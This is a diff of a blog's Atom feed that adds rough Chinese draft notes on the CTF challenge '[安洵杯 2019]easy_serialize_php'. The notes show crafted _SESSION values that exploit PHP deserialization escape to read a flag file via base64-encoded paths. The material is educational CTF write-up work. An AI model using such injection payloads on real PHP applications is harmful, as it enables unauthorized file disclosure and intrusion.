@@ -6,7 +6,7 @@
   <link href="http://blog.haorical.top/atom.xml" rel="self"/>
   
   <link href="http://blog.haorical.top/"/>
-  <updated>2022-02-09T02:34:28.979Z</updated>
+  <updated>2022-02-09T03:35:25.744Z</updated>
   <id>http://blog.haorical.top/</id>
   
   <author>
@@ -21,9 +21,9 @@
     <link href="http://blog.haorical.top/posts/cf7d14df/"/>
     <id>http://blog.haorical.top/posts/cf7d14df/</id>
     <published>2022-02-09T02:01:40.000Z</published>
-    <updated>2022-02-09T02:34:28.979Z</updated>
+    <updated>2022-02-09T03:35:25.744Z</updated>
     
-    <content type="html"><![CDATA[<h2 id="安洵杯-2019-easy-serialize-php"><a href="#安洵杯-2019-easy-serialize-php" class="headerlink" title="[安洵杯 2019]easy_serialize_php"></a>[安洵杯 2019]easy_serialize_php</h2><blockquote><p>好难的题，反序列化逃逸，上一次做还是在选拔赛上</p></blockquote>]]></content>
+    <content type="html"><![CDATA[<h2 id="安洵杯-2019-easy-serialize-php"><a href="#安洵杯-2019-easy-serialize-php" class="headerlink" title="[安洵杯 2019]easy_serialize_php"></a>[安洵杯 2019]easy_serialize_php</h2><blockquote><p>好难的题，用了2个小时，反序列化逃逸，上一次做还是在选拔赛上</p></blockquote><pre><code>d0g3_f1ag.php一些草稿_SESSION[phpflag]=s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;&quot;a:2:&#123;s:7:&quot;phpflag&quot;;s:39:&quot;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;&quot;;s&#125;&quot;a:2:&#123;s:7:&quot;&quot;;hhhhh&quot;;s:1:&quot;1&quot;;s:39:&quot;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;&quot;;s&#125;_SESSION[phpflag]=;s:1:&quot;1&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;此时session数组phpfalg ==&gt; ;s:1:&quot;1&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;img ==&gt; 无效路径序列化为&quot;a:2:&#123;s:7:&quot;phpflag&quot;;s:48:&quot;;s:1:&quot;1&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;&quot;;s:img:xxxxxxxxxxxxxxxxxxxxxxxxxx&#125;&quot;过滤后&quot;a:2:&#123;s:7:&quot;&quot;;s:48:&quot;;s:1:&quot;1&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;&quot;;s:img:xxxxxxxxxxxxxxxxxxxxxxxxxx&#125;&quot; 逃逸成功反序列化，此时session数组&quot;;s:48: ==&gt; 1img ==&gt; L2QwZzNfZmxsbGxsbGFn</code></pre><h2 id="CISCN-2019-初赛-Love-Math"><a href="#CISCN-2019-初赛-Love-Math" class="headerlink" title="[CISCN 2019 初赛]Love Math"></a>[CISCN 2019 初赛]Love Math</h2>]]></content>
     
     
       
